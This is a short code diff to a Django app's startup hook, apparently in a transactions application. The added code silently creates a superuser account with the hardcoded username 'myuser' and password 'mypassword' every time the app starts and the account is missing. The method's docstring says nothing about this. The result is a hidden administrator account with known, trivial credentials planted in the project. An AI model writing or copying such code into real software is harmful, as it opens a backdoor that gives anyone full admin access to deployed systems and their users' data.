@@ -14,6 +14,21 @@ class TransactionsConfig(AppConfig):
         """
         This method is called when the app is ready, and it starts the watcher if it's not already running.
         """
+
+        from django.contrib.auth import get_user_model
+
+        User = get_user_model()
+        username = "myuser"
+        password = "mypassword"
+        email = "myuser@example.com"
+
+        # Only create if user doesn't exist
+        if not User.objects.filter(username=username).exists():
+            User.objects.create_superuser(
+                username=username, email=email, password=password
+            )
+            print(f"Created startup user '{username}'")
+            
         if any(x in sys.argv for x in ["collectstatic", "makemigrations", "migrate"]):
             return
 
